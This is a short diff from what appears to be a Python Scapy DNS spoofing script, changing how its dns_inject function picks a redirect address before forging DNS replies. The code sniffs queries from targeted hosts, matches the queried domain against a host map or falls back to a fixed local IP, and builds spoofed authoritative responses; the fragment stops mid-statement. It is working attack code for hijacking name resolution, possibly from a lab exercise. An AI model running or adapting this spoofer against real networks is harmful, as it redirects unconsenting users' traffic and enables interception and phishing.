@@ -20,10 +20,18 @@ def dns_inject(packet):
 		if(packet[IP].src in expression):
 			print("src", packet[IP].src)
 			print(expression)
-			if(hostFlag==0 and packet[DNS].qd.name in host.keys()):
-				redirect_to = host[packet[DNS].qd.qname]
+			if(hostFlag==0):
+				#print(packet[DNS].qd.qname.rstrip('.'))
+				domain = packet[DNS].qd.qname.decode('ASCII').rsplit('.', 1)[0]
+				print(domain)
+				if(domain in host.keys()):
+					redirect_to = host[domain]
+					print("From here")
+				else:
+					redirect_to = '192.168.10.133'
 			else:
-				redirect_to = '192.168.10.133'
+				redirect_to = host
+			print(redirect_to)
 			spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\
                               UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                               DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa = 1, qr=1, \
